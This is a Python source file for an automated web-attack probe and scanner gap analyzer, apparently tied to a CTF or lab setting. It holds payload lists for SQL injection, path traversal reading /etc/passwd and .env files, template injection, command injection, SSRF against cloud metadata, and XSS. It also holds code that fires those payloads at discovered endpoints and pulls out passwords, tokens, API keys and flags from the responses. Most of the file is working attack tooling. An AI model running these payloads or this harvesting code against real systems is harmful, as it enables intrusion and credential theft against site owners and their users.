import re
import json
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional

try:
    import requests
except ImportError:
    requests = None


IMPROVEMENT_LOG_DIR = Path(__file__).parent / "improvement_logs"
IMPROVEMENT_LOG_DIR.mkdir(exist_ok=True)
GAP_ANALYSIS_DIR = Path(__file__).parent / "gap_analysis"
GAP_ANALYSIS_DIR.mkdir(exist_ok=True)


PROBE_PAYLOADS = {
    "sqli": {
        "payloads": [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "1' ORDER BY 1--",
            "1 UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "admin'--",
            "' AND '1'='1",
            "1; SELECT * FROM users",
        ],
        "success_indicators": [
            r"syntax error",
            r"mysql",
            r"sqlite",
            r"postgresql",
            r"ORA-\d+",
            r"SQL syntax",
            r"unclosed quotation",
            r"unterminated string",
            r"query failed",
        ],
        "data_indicators": [
            r"admin",
            r"password",
            r"username",
            r"email.*@",
            r"user_id",
            r"SELECT.*FROM",
        ],
    },
    "lfi": {
        "payloads": [
            "../etc/passwd",
            "....//....//etc/passwd",
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            r"....\/....\/etc/passwd",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "../data/config.ini",
            "../.env",
            "../.git/config",
        ],
        "success_indicators": [
            r"root:.*:0:0",
            r"\[database\]",
            r"\[api\]",
            r"password\s*=",
            r"secret.*=",
            r"DB_PASSWORD",
            r"API_KEY",
            r"BEGIN.*PRIVATE KEY",
        ],
        "data_indicators": [
            r"root:",
            r"password",
            r"secret",
            r"key",
            r"token",
        ],
    },
    "ssti": {
        "payloads": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{config}}",
            "{{self.__class__}}",
            "{{''.__class__.__mro__}}",
            "${T(java.lang.Runtime).getRuntime()}",
            "{{request.application.__globals__}}",
        ],
        "success_indicators": [
            r"^49$",
            r"<Config",
            r"<class",
            r"__class__",
            r"__mro__",
            r"java\.lang",
            r"SECRET_KEY",
        ],
        "data_indicators": [
            r"config",
            r"secret",
            r"password",
            r"key",
        ],
    },
    "cmdi": {
        "payloads": [
            "; id",
            "| id",
            "& id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "&& whoami",
        ],
        "success_indicators": [
            r"uid=\d+",
            r"root:.*:0:0",
            r"gid=\d+",
            r"groups=",
            r"^root$",
            r"^www-data$",
            r"^kali$",
        ],
        "data_indicators": [
            r"uid=",
            r"root:",
            r"whoami",
        ],
    },
    "ssrf": {
        "payloads": [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://127.0.0.1:5555/",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]/",
            "http://0x7f000001/",
            "http://2130706433/",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
        ],
        "success_indicators": [
            r"ami-id",
            r"instance-id",
            r"iam/security-credentials",
            r"root:.*:0:0",
            r"localhost",
            r"internal",
            r"<title>.*SecureBank",
        ],
        "data_indicators": [
            r"AccessKeyId",
            r"SecretAccessKey",
            r"Token",
            r"internal",
        ],
    },
    "xss": {
        "payloads": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<body onload=alert(1)>",
        ],
        "success_indicators": [
            r"<script>alert\(1\)</script>",
            r"onerror=alert",
            r"onload=alert",
            r"javascript:alert",
        ],
        "data_indicators": [],
    },
}


COMMON_PARAM_ENDPOINTS = [
    ("search", "q"),
    ("search", "query"),
    ("search", "s"),
    ("file", "name"),
    ("file", "path"),
    ("file", "file"),
    ("download", "file"),
    ("download", "path"),
    ("view", "file"),
    ("read", "file"),
    ("include", "page"),
    ("page", "file"),
    ("fetch", "url"),
    ("proxy", "url"),
    ("proxy", "target"),
    ("redirect", "url"),
    ("redirect", "next"),
    ("goto", "url"),
    ("preview", "content"),
    ("preview", "template"),
    ("template", "name"),
    ("render", "template"),
    ("ping", "host"),
    ("ping", "ip"),
    ("lookup", "domain"),
    ("cmd", "command"),
    ("exec", "cmd"),
    ("greet", "name"),
    ("hello", "name"),
    ("user", "id"),
    ("profile", "id"),
    ("api/user", "id"),
]


class SmartProbe:
    def __init__(self, target: str, timeout: int = 10):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.findings: list[dict[str, Any]] = []
        self.improvement_suggestions: list[dict[str, Any]] = []
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "AgentBLACK/1.0 SmartProbe",
        })
    
    def probe_all(self) -> dict[str, Any]:
        print("\n" + "=" * 60)
        print("🧠 AGENT BLACK SMART PROBE")
        print("   Going beyond Lantern's capabilities...")
        print("=" * 60)
        
        discovered_endpoints = self._discover_endpoints()
        print(f"\n📍 Discovered {len(discovered_endpoints)} potential endpoints")
        
        for endpoint, param in discovered_endpoints:
            for vuln_type, config in PROBE_PAYLOADS.items():
                self._test_endpoint(endpoint, param, vuln_type, config)
        
        self._check_common_files()
        
        self._generate_improvement_suggestions()
        
        return self._compile_results()
    
    def _discover_endpoints(self) -> list[tuple[str, str]]:
        endpoints = []
        
        for endpoint, param in COMMON_PARAM_ENDPOINTS:
            url = f"{self.target}/{endpoint}"
            try:
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=False)
                if resp.status_code != 404:
                    endpoints.append((endpoint, param))
            except:
                pass
        
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            forms = re.findall(r'action=["\']([^"\']+)["\']', resp.text)
            inputs = re.findall(r'name=["\']([^"\']+)["\']', resp.text)
            
            for form_action in forms:
                if form_action.startswith("/"):
                    form_action = form_action[1:]
                for input_name in inputs[:5]:
                    endpoints.append((form_action, input_name))
        except:
            pass
        
        return list(set(endpoints))
    
    def _test_endpoint(
        self,
        endpoint: str,
        param: str,
        vuln_type: str,
        config: dict[str, Any],
    ) -> None:
        url = f"{self.target}/{endpoint}"
        
        try:
            baseline_resp = self.session.get(
                url,
                params={param: "test123"},
                timeout=self.timeout,
            )
            baseline_len = len(baseline_resp.text)
            baseline_status = baseline_resp.status_code
        except:
            return
        
        for payload in config["payloads"]:
            try:
                resp = self.session.get(
                    url,
                    params={param: payload},
                    timeout=self.timeout,
                )
                
                for indicator in config["success_indicators"]:
                    if re.search(indicator, resp.text, re.IGNORECASE | re.MULTILINE):
                        finding = {
                            "type": vuln_type,
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "indicator_matched": indicator,
                            "response_snippet": resp.text[:500],
                            "status_code": resp.status_code,
                        }
                        
                        for data_pattern in config.get("data_indicators", []):
                            data_matches = re.findall(
                                data_pattern,
                                resp.text,
                                re.IGNORECASE,
                            )
                            if data_matches:
                                finding["extracted_data"] = data_matches[:10]
                        
                        flags = re.findall(
                            r"(?:BLACKFLAG|FLAG|flag|CTF)\{[^}]+\}",
                            resp.text,
                            re.IGNORECASE,
                        )
                        if flags:
                            finding["flags_found"] = flags
                        
                        secrets = []
                        secret_patterns = [
                            (r"password[:\s=]+['\"]?([^\s'\"<>]+)", "password"),
                            (r"secret[:\s=]+['\"]?([^\s'\"<>]+)", "secret"),
                            (r"api[_-]?key[:\s=]+['\"]?([^\s'\"<>]+)", "api_key"),
                            (r"token[:\s=]+['\"]?([^\s'\"<>]+)", "token"),
                        ]
                        for pattern, secret_type in secret_patterns:
                            matches = re.findall(pattern, resp.text, re.IGNORECASE)
                            for m in matches:
                                secrets.append({"type": secret_type, "value": m})
                        if secrets:
                            finding["secrets_found"] = secrets
                        
                        self.findings.append(finding)
                        
                        print(f"\n🎯 FOUND: {vuln_type.upper()} at {url}?{param}=")
                        print(f"   Payload: {payload[:50]}...")
                        if finding.get("flags_found"):
                            print(f"   🚩 FLAGS: {finding['flags_found']}")
                        if finding.get("secrets_found"):
                            print(f"   🔑 SECRETS: {len(finding['secrets_found'])} found")
                        
                        break
                
            except Exception as e:
                pass
    
    def _check_common_files(self) -> None:
        common_files = [
            "robots.txt",
            ".env",
            ".git/config",
            ".git/HEAD",
            "backup.sql",
            "config.ini",
            "config.php.bak",
            "web.config",
            ".htaccess",
            "sitemap.xml",
            "debug/",
            "admin-backup/",
            "api/internal/config",
            ".svn/entries",
            "composer.json",
            "package.json",
        ]
        
        for file_path in common_files:
            url = f"{self.target}/{file_path}"
            try:
                resp = self.session.get(url, timeout=self.timeout)
                if resp.status_code == 200 and len(resp.text) > 10:
                    sensitive_patterns = [
                        r"password",
                        r"secret",
                        r"api[_-]?key",
                        r"token",
                        r"credential",
                        r"admin",
                        r"Disallow:",
                        r"\[database\]",
                        r"BEGIN.*KEY",
                    ]
                    
                    for pattern in sensitive_patterns:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            finding = {
                                "type": "sensitive_file",
                                "url": url,
                                "file_path": file_path,
                                "response_snippet": resp.text[:1000],
                            }
                            
                            flags = re.findall(
                                r"(?:BLACKFLAG|FLAG|flag|CTF)\{[^}]+\}",
                                resp.text,
                                re.IGNORECASE,
                            )
                            if flags:
                                finding["flags_found"] = flags
                            
                            self.findings.append(finding)
                            print(f"\n📄 SENSITIVE FILE: {url}")
                            if flags:
                                print(f"   🚩 FLAGS: {flags}")
                            break
                            
            except:
                pass
    
    def _generate_improvement_suggestions(self) -> None:
        for finding in self.findings:
            vuln_type = finding.get("type", "unknown")
            payload = finding.get("payload", "")
            indicator = finding.get("indicator_matched", "")
            url = finding.get("url", "")
            
            suggestion = {
                "finding_type": vuln_type,
                "url": url,
                "what_agent_found": f"Agent BLACK found {vuln_type} that Lantern missed",
                "payload_that_worked": payload,
                "indicator_pattern": indicator,
                "suggested_lantern_improvement": "",
                "suggested_detection_regex": "",
                "suggested_payload_addition": "",
                "code_suggestion": "",
            }
            
            if vuln_type == "sqli":
                suggestion["suggested_lantern_improvement"] = (
                    f"Add Flask/Python SQLite error detection pattern"
                )
                suggestion["suggested_detection_regex"] = (
                    r"sqlite3\.OperationalError|near.*syntax|unrecognized token"
                )
                suggestion["suggested_payload_addition"] = payload
                suggestion["code_suggestion"] = f'''
# Add to modules/sqli.py in SQLI_PATTERNS:
FLASK_SQLITE_ERRORS = [
    r"sqlite3\\.OperationalError",
    r"near.*syntax",
    r"unrecognized token",
    r"no such column",
]

# The working payload was: {payload}
# Matched indicator: {indicator}
'''
            
            elif vuln_type == "lfi":
                suggestion["suggested_lantern_improvement"] = (
                    f"Add detection for Flask file reading responses"
                )
                suggestion["suggested_detection_regex"] = indicator
                suggestion["suggested_payload_addition"] = payload
                suggestion["code_suggestion"] = f'''
# Add to modules/lfi.py:
# Payload that worked: {payload}
# Consider adding path variations for Flask apps:
FLASK_LFI_PATHS = [
    "../data/config.ini",
    "../.env", 
    "../instance/config.py",
    "../app/config.py",
]

# Detection pattern that worked: {indicator}
'''
            
            elif vuln_type == "ssti":
                suggestion["suggested_lantern_improvement"] = (
                    f"Add Jinja2/Flask SSTI detection"
                )
                suggestion["suggested_detection_regex"] = r"^49$|<Config|__class__"
                suggestion["code_suggestion"] = f'''
# Add to modules/ssti.py:
JINJA2_PAYLOADS = [
    "{{{{7*7}}}}",
    "{{{{config}}}}",
    "{{{{self.__class__}}}}",
]

# Detection: Look for "49" (7*7), "<Config", or "__class__" in response
# Working payload: {payload}
'''
            
            elif vuln_type == "sensitive_file":
                file_path = finding.get("file_path", "")
                suggestion["suggested_lantern_improvement"] = (
                    f"Add {file_path} to sensitive file enumeration"
                )
                suggestion["code_suggestion"] = f'''
# Add to modules/disclosure.py or modules/dirbust.py:
SENSITIVE_PATHS.append("{file_path}")

# This file contained sensitive data at: {url}
'''
            
            if suggestion["suggested_lantern_improvement"]:
                self.improvement_suggestions.append(suggestion)
    
    def _compile_results(self) -> dict[str, Any]:
        all_flags = []
        all_secrets = []
        
        for finding in self.findings:
            all_flags.extend(finding.get("flags_found", []))
            all_secrets.extend(finding.get("secrets_found", []))
        
        all_flags = list(set(all_flags))
        
        result = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target": self.target,
            "total_findings": len(self.findings),
            "findings": self.findings,
            "flags_found": all_flags,
            "secrets_found": all_secrets,
            "improvement_suggestions": self.improvement_suggestions,
        }
        
        self._save_improvement_log(result)
        
        return result
    
    def _save_improvement_log(self, result: dict[str, Any]) -> Path:
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        log_file = IMPROVEMENT_LOG_DIR / f"improvements_{timestamp}.json"
        log_file.write_text(json.dumps(result, indent=2), encoding="utf-8")
        
        if self.improvement_suggestions:
            md_file = IMPROVEMENT_LOG_DIR / f"improvements_{timestamp}.md"
            md_content = self._generate_markdown_report(result)
            md_file.write_text(md_content, encoding="utf-8")
            print(f"\n📝 Improvement suggestions saved to: {md_file}")
        
        return log_file
    
    def _generate_markdown_report(self, result: dict[str, Any]) -> str:
        lines = [
            "# Agent BLACK - Lantern Improvement Suggestions",
            "",
            f"**Target:** {result['target']}",
            f"**Date:** {result['timestamp']}",
            f"**Findings:** {result['total_findings']}",
            "",
            "---",
            "",
            "## Summary",
            "",
            "Agent BLACK found vulnerabilities that Lantern missed. Below are suggestions for improving Lantern's detection capabilities.",
            "",
        ]
        
        if result["flags_found"]:
            lines.extend([
                "## 🚩 Flags Captured",
                "",
            ])
            for flag in result["flags_found"]:
                lines.append(f"- `{flag}`")
            lines.append("")
        
        if result["secrets_found"]:
            lines.extend([
                "## 🔑 Secrets Extracted",
                "",
            ])
            for secret in result["secrets_found"][:10]:
                lines.append(f"- **{secret['type']}**: `{secret['value'][:50]}...`")
            lines.append("")
        
        lines.extend([
            "---",
            "",
            "## Improvement Suggestions",
            "",
        ])
        
        for i, suggestion in enumerate(self.improvement_suggestions, 1):
            lines.extend([
                f"### {i}. {suggestion['finding_type'].upper()} Detection Gap",
                "",
                f"**What Agent Found:** {suggestion['what_agent_found']}",
                "",
                f"**URL:** `{suggestion['url']}`",
                "",
                f"**Payload That Worked:**",
                "```",
                suggestion['payload_that_worked'],
                "```",
                "",
                f"**Suggested Improvement:** {suggestion['suggested_lantern_improvement']}",
                "",
                f"**Code to Add:**",
                "```python",
                suggestion['code_suggestion'],
                "```",
                "",
                "---",
                "",
            ])
        
        return "\n".join(lines)


def run_smart_probe(target: str) -> dict[str, Any]:
    probe = SmartProbe(target)
    return probe.probe_all()


def print_probe_summary(result: dict[str, Any]) -> None:
    print("\n" + "=" * 60)
    print("🧠 AGENT BLACK SMART PROBE SUMMARY")
    print("=" * 60)
    
    print(f"\nFindings: {result['total_findings']}")
    
    if result["flags_found"]:
        print(f"\n🚩 FLAGS CAPTURED ({len(result['flags_found'])}):")
        for flag in result["flags_found"]:
            print(f"   🏴 {flag}")
    
    if result["secrets_found"]:
        print(f"\n🔑 SECRETS ({len(result['secrets_found'])}):")
        for secret in result["secrets_found"][:10]:
            print(f"   → {secret['type']}: {secret['value'][:40]}...")
    
    if result["improvement_suggestions"]:
        print(f"\n💡 LANTERN IMPROVEMENTS SUGGESTED ({len(result['improvement_suggestions'])}):")
        for suggestion in result["improvement_suggestions"]:
            print(f"   → {suggestion['finding_type'].upper()}: {suggestion['suggested_lantern_improvement']}")
    
    print("\n" + "=" * 60)


class GapAnalyzer:
    def __init__(self, llm_provider=None):
        self.llm = llm_provider
        self.analysis_dir = GAP_ANALYSIS_DIR
    
    def analyze_scan_gaps(
        self,
        lantern_findings: list[dict[str, Any]],
        probe_findings: list[dict[str, Any]],
        target: str,
        scan_config: dict[str, Any] = None,
    ) -> dict[str, Any]:
        lantern_modules = set(f.get("module", "unknown") for f in lantern_findings)
        probe_types = set(f.get("type", "unknown") for f in probe_findings)
        
        missed_by_lantern = []
        for probe_finding in probe_findings:
            probe_type = probe_finding.get("type", "")
            matching_lantern = any(
                probe_type.lower() in lf.get("module", "").lower() or
                probe_type.lower() in lf.get("type", "").lower()
                for lf in lantern_findings
            )
            if not matching_lantern:
                missed_by_lantern.append(probe_finding)
        
        analysis = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target": target,
            "scan_config": scan_config or {},
            "lantern_findings_count": len(lantern_findings),
            "probe_findings_count": len(probe_findings),
            "missed_by_lantern": missed_by_lantern,
            "gap_count": len(missed_by_lantern),
            "coverage_analysis": self._analyze_coverage(lantern_modules, probe_types),
            "structured_diagnosis": None,
            "improvement_proposals": [],
        }
        
        if missed_by_lantern:
            analysis["structured_diagnosis"] = self._generate_structured_diagnosis(
                missed_by_lantern, target, scan_config
            )
            analysis["improvement_proposals"] = self._generate_improvement_proposals(
                analysis["structured_diagnosis"]
            )
        
        self._save_analysis(analysis)
        
        return analysis
    
    def _analyze_coverage(
        self,
        lantern_modules: set[str],
        probe_types: set[str],
    ) -> dict[str, Any]:
        module_type_mapping = {
            "sqli": ["sqli", "sql_injection", "sql"],
            "xss": ["xss", "cross_site_scripting", "reflected_xss", "stored_xss"],
            "lfi": ["lfi", "local_file_inclusion", "path_traversal", "file_read"],
            "ssti": ["ssti", "template_injection", "server_side_template"],
            "cmdi": ["cmdi", "command_injection", "os_command", "rce"],
            "ssrf": ["ssrf", "server_side_request_forgery"],
            "xxe": ["xxe", "xml_external_entity"],
        }
        
        coverage = {
            "modules_tested": list(lantern_modules),
            "vulnerabilities_found": list(probe_types),
            "coverage_gaps": [],
        }
        
        for probe_type in probe_types:
            covered = False
            for module, types in module_type_mapping.items():
                if any(t in probe_type.lower() for t in types):
                    if module in lantern_modules:
                        covered = True
                        break
            
            if not covered:
                coverage["coverage_gaps"].append({
                    "vulnerability_type": probe_type,
                    "suggested_module": self._suggest_module(probe_type),
                })
        
        return coverage
    
    def _suggest_module(self, vuln_type: str) -> str:
        vuln_lower = vuln_type.lower()
        if "sql" in vuln_lower:
            return "sqli"
        if "xss" in vuln_lower or "script" in vuln_lower:
            return "xss"
        if "file" in vuln_lower or "path" in vuln_lower:
            return "lfi"
        if "template" in vuln_lower:
            return "ssti"
        if "command" in vuln_lower or "exec" in vuln_lower:
            return "cmdi"
        if "ssrf" in vuln_lower or "request" in vuln_lower:
            return "ssrf"
        return "disclosure"
    
    def _generate_structured_diagnosis(
        self,
        missed_findings: list[dict[str, Any]],
        target: str,
        scan_config: dict[str, Any],
    ) -> dict[str, Any]:
        diagnosis = {
            "summary": f"LANTERN missed {len(missed_findings)} vulnerabilities on {target}",
            "root_causes": [],
            "affected_modules": [],
            "potential_improvements": [],
            "implementation_suggestions": [],
            "priority": "HIGH" if len(missed_findings) > 3 else "MEDIUM",
        }
        
        by_type: dict[str, list] = {}
        for finding in missed_findings:
            ftype = finding.get("type", "unknown")
            if ftype not in by_type:
                by_type[ftype] = []
            by_type[ftype].append(finding)
        
        for vuln_type, findings in by_type.items():
            suggested_module = self._suggest_module(vuln_type)
            
            root_cause = {
                "vulnerability_type": vuln_type,
                "count": len(findings),
                "reason": self._determine_root_cause(findings, suggested_module),
            }
            diagnosis["root_causes"].append(root_cause)
            
            if suggested_module not in diagnosis["affected_modules"]:
                diagnosis["affected_modules"].append(suggested_module)
            
            improvement = {
                "type": vuln_type,
                "module": suggested_module,
                "description": f"Enhance {suggested_module} module to detect {vuln_type}",
                "payloads_to_add": [f.get("payload", "") for f in findings if f.get("payload")],
                "patterns_to_add": [f.get("indicator_matched", "") for f in findings if f.get("indicator_matched")],
            }
            diagnosis["potential_improvements"].append(improvement)
            
            implementation = self._generate_implementation_suggestion(improvement)
            diagnosis["implementation_suggestions"].append(implementation)
        
        return diagnosis
    
    def _determine_root_cause(self, findings: list[dict[str, Any]], module: str) -> str:
        causes = []
        
        payloads = [f.get("payload", "") for f in findings if f.get("payload")]
        if payloads:
            causes.append("Missing payload variations in module")
        
        indicators = [f.get("indicator_matched", "") for f in findings if f.get("indicator_matched")]
        if indicators:
            causes.append("Insufficient detection patterns")
        
        endpoints = [f.get("url", "") for f in findings]
        if any("api" in e.lower() for e in endpoints):
            causes.append("API endpoint coverage gap")
        
        if not causes:
            causes.append("Module may not be testing this vulnerability class")
        
        return "; ".join(causes)
    
    def _generate_implementation_suggestion(self, improvement: dict[str, Any]) -> dict[str, Any]:
        module = improvement.get("module", "unknown")
        payloads = improvement.get("payloads_to_add", [])
        patterns = improvement.get("patterns_to_add", [])
        
        suggestion = {
            "target_file": f"modules/{module}.py",
            "change_type": "enhancement",
            "code_template": "",
            "estimated_impact": "MEDIUM",
        }
        
        code_lines = [
            f"# Auto-generated improvement for {module} module",
            f"# Based on gap analysis findings",
            "",
        ]
        
        if payloads:
            code_lines.append(f"ADDITIONAL_{module.upper()}_PAYLOADS = [")
            for p in payloads[:10]:
                escaped = p.replace('"', '\\"')
                code_lines.append(f'    "{escaped}",')
            code_lines.append("]")
            code_lines.append("")
        
        if patterns:
            code_lines.append(f"ADDITIONAL_{module.upper()}_PATTERNS = [")
            for p in patterns[:10]:
                escaped = p.replace("\\", "\\\\")
                code_lines.append(f'    r"{escaped}",')
            code_lines.append("]")
        
        suggestion["code_template"] = "\n".join(code_lines)
        
        return suggestion
    
    def _generate_improvement_proposals(
        self,
        diagnosis: dict[str, Any],
    ) -> list[dict[str, Any]]:
        proposals = []
        
        for improvement in diagnosis.get("potential_improvements", []):
            impl = next(
                (s for s in diagnosis.get("implementation_suggestions", [])
                 if s.get("target_file", "").endswith(f"{improvement.get('module', '')}.py")),
                {}
            )
            
            proposal = {
                "id": f"proposal_{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}_{improvement.get('module', 'unknown')}",
                "module": improvement.get("module"),
                "description": improvement.get("description"),
                "priority": diagnosis.get("priority", "MEDIUM"),
                "code_changes": impl.get("code_template", ""),
                "expected_impact": f"Detect {improvement.get('type')} vulnerabilities",
                "status": "proposed",
            }
            proposals.append(proposal)
        
        return proposals
    
    def _save_analysis(self, analysis: dict[str, Any]):
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        analysis_file = self.analysis_dir / f"gap_analysis_{timestamp}.json"
        analysis_file.write_text(json.dumps(analysis, indent=2), encoding="utf-8")
    
    def generate_llm_diagnosis_prompt(
        self,
        missed_findings: list[dict[str, Any]],
        target: str,
    ) -> str:
        findings_summary = json.dumps(missed_findings[:5], indent=2)
        
        prompt = f"""Analyze the following security scanning gaps and propose improvements.

TARGET: {target}

MISSED VULNERABILITIES (Agent BLACK found these, LANTERN did not):
{findings_summary}

Provide a structured JSON response with:
1. "root_cause_analysis": Why LANTERN missed these
2. "payloads_needed": List of payloads to add
3. "patterns_needed": List of detection patterns to add  
4. "module_to_modify": Which LANTERN module needs changes
5. "code_patch": Python code to add to the module
6. "confidence_score": 0.0-1.0 confidence in this fix

Respond with ONLY valid JSON."""
        
        return prompt
    
    def parse_llm_diagnosis(self, llm_response: str) -> Optional[dict[str, Any]]:
        try:
            json_match = re.search(r'```json\s*(.*?)\s*```', llm_response, re.DOTALL)
            if json_match:
                return json.loads(json_match.group(1))
            
            return json.loads(llm_response)
        except:
            return None


def run_gap_analysis(
    target: str,
    lantern_findings: list[dict[str, Any]] = None,
    probe_findings: list[dict[str, Any]] = None,
) -> dict[str, Any]:
    if probe_findings is None:
        probe = SmartProbe(target)
        probe_result = probe.probe_all()
        probe_findings = probe_result.get("findings", [])
    
    analyzer = GapAnalyzer()
    return analyzer.analyze_scan_gaps(
        lantern_findings=lantern_findings or [],
        probe_findings=probe_findings,
        target=target,
    )


def get_latest_gap_analysis() -> Optional[dict[str, Any]]:
    results = sorted(GAP_ANALYSIS_DIR.glob("gap_analysis_*.json"), reverse=True)
    if results:
        return json.loads(results[0].read_text(encoding="utf-8"))
    return None


def print_gap_analysis(analysis: dict[str, Any]) -> str:
    lines = [
        "",
        "=" * 70,
        "GAP ANALYSIS REPORT",
        "=" * 70,
        "",
        f"Target: {analysis.get('target', 'N/A')}",
        f"Timestamp: {analysis.get('timestamp', 'N/A')}",
        f"LANTERN Findings: {analysis.get('lantern_findings_count', 0)}",
        f"Probe Findings: {analysis.get('probe_findings_count', 0)}",
        f"Gaps Identified: {analysis.get('gap_count', 0)}",
        "",
    ]
    
    diagnosis = analysis.get("structured_diagnosis")
    if diagnosis:
        lines.append("DIAGNOSIS:")
        lines.append(f"  Priority: {diagnosis.get('priority', 'N/A')}")
        lines.append(f"  Summary: {diagnosis.get('summary', 'N/A')}")
        lines.append("")
        
        if diagnosis.get("root_causes"):
            lines.append("ROOT CAUSES:")
            for rc in diagnosis["root_causes"]:
                lines.append(f"  - {rc.get('vulnerability_type')}: {rc.get('reason')}")
            lines.append("")
        
        if diagnosis.get("affected_modules"):
            lines.append(f"AFFECTED MODULES: {', '.join(diagnosis['affected_modules'])}")
            lines.append("")
    
    proposals = analysis.get("improvement_proposals", [])
    if proposals:
        lines.append(f"IMPROVEMENT PROPOSALS ({len(proposals)}):")
        for p in proposals:
            lines.append(f"  [{p.get('priority', 'N/A')}] {p.get('module', 'N/A')}: {p.get('description', 'N/A')}")
        lines.append("")
    
    lines.append("=" * 70)
    
    return "\n".join(lines)
